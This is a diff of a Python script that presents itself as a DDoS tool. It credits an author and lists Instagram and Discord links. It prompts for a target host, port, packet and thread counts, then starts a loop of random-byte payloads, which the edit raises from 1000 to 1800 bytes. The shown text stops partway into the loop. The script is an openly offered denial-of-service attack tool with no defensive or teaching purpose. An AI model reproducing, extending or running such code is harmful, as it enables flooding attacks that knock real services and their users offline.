@@ -3,28 +3,28 @@ import random
 import socket
 import threading
 
-print ("########  ######## ##     ##  #######  ##    ## ########  ######## ##    ## ######## ##    ##") 
-print ("##     ## ##       ###   ### ##     ## ###   ## ##     ## ##       ###   ##      ##   ##  ##")
-print ("##     ## ##       #### #### ##     ## ####  ## ##     ## ##       ####  ##     ##     ####   ")
-print ("##     ## ######   ## ### ## ##     ## ## ## ## ########  ######   ## ## ##    ##       ##   ") 
-print ("##     ## ##       ##     ## ##     ## ##  #### ##   ##   ##       ##  ####   ##        ##    ")
-print ("##     ## ##       ##     ## ##     ## ##   ### ##    ##  ##       ##   ###  ##         ##  ")  
-print ("########  ######## ##     ##  #######  ##    ## ##     ## ######## ##    ## ########    ##  ")  
+print ("########  ######## ##     ##  #######  ##    ## ") 
+print ("##     ## ##       ###   ### ##     ## ###   ## ")
+print ("##     ## ##       #### #### ##     ## ####  ## ")
+print ("##     ## ######   ## ### ## ##     ## ## ## ## ") 
+print ("##     ## ##       ##     ## ##     ## ##  #### ")
+print ("##     ## ##       ##     ## ##     ## ##   ### ")  
+print ("########  ######## ##     ##  #######  ##    ## ")  
 
 print       (" - - > TOOLS CREATED BY DEMON RENZY < - - ")
 print       (" - - > INSTAGRAM : sndigans_ < - - ")
 print       (" - - > DISCORD : XDemonRenzy#8851<- - ")                                   
 print       (" - - > DM ME IF YOU NEED HELP < - - ")
-print       (" - - > JOIN OUR COMMUNITY AND LEARN TOGETHER< - - ")
-print       (" - - > https://discord.gg/9BsRU4QAka < - - ")
+print       (" - - > JOIN RZ TEAM TO LEARN AGAIN < - - ")
+print       (" - - > https://discord.gg/FBwqssW4gy < - - ")
     
 ip = str(input("  HOST/IP:"))
 port = int(input(" Port:"))
-choice = str(input(" Mau Gass?(y/n):"))
-times = int(input(" Paket:"))
-threads = int(input(" Threads:"))
+choice = str(input(" Want Ddos?(y/n):"))
+times = int(input(" Packets :"))
+threads = int(input(" Threads :"))
 def run():
-	data = random._urandom(1000)
+	data = random._urandom(1800)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
